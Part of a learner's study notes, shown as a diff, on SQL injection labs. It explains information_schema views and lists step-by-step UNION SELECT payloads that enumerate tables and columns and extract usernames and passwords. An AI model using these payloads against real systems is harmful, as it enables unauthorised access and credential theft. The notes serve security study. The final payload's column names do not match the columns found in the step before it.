@@ -86,3 +86,41 @@ To check sql version:- ' UNION SELECT @@version--
     3.then solved
 
 LOGIC USED:- use @@version to check database version and dont forget to check no of columns first
+
+-----THEORY:- Most database types (except Oracle) have a set of views called the information schema. This provides information about the database.
+
+For example, you can query information_schema.tables to list the tables in the database:
+           SELECT * FROM information_schema.tables
+
+This returns output like the following:
+TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  TABLE_TYPE
+=====================================================
+MyDatabase     dbo           Products    BASE TABLE
+MyDatabase     dbo           Users       BASE TABLE
+MyDatabase     dbo           Feedback    BASE TABLE
+
+This output indicates that there are three tables, called Products, Users, and Feedback.
+
+You can then query information_schema.columns to list the columns in individual tables:
+          SELECT * FROM information_schema.columns WHERE table_name = 'Users'
+
+This returns output like the following:
+TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  COLUMN_NAME  DATA_TYPE
+=================================================================
+MyDatabase     dbo           Users       UserId       int
+MyDatabase     dbo           Users       Username     varchar
+MyDatabase     dbo           Users       Password     varchar
+
+This output shows the columns in the specified table and the data type of each column.
+
+
+#8 Lab:SQL injection attack, listing the database contents on non-Oracle databases
+
+    1.'+UNION+SELECT+NULL,NULL--+  (used to check no of columns)
+    2.'+UNION+SELECT+table_name, NULL+FROM+information_schema.tables--+  (to find list of tables)
+    3.'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_uhvouq'-- (to find columns in users_uhvouq table)
+    got columns like email,password,username
+    4.'+UNION+SELECT+username_table,+password_table+FROM+users_uhvouq--  (to get list of username and password)
+
+LOGIC USED:- use information_schema.tables to find tables and information_schema.columns to find columns in that particular table
+
